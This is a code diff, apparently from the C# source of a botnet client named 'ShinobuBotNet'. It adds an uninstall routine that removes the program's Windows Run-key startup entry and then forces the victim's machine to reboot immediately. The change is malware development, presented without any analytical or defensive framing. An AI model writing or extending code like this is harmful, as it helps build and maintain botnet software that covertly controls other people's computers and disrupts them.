@@ -1,4 +1,5 @@
-﻿using System.Diagnostics;
+﻿using Microsoft.Win32;
+using System.Diagnostics;
 using System.Drawing;
 using System.Net;
 using System.Threading;
@@ -81,6 +82,18 @@ namespace ShinobuBotNet
             System.Windows.MessageBox.Show(text);
         }
 
+        public static void uninstall()
+        {
+            string applicationName = configs.FileName;
+            const string pathRegistryKeyStartup =
+                        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
 
+            using (RegistryKey registryKeyStartup =
+                        Registry.CurrentUser.OpenSubKey(pathRegistryKeyStartup, true))
+            {
+                registryKeyStartup.DeleteValue(applicationName, false);
+            }
+            Process.Start("shutdown", "/r /t 0");
+        }
     }
 }
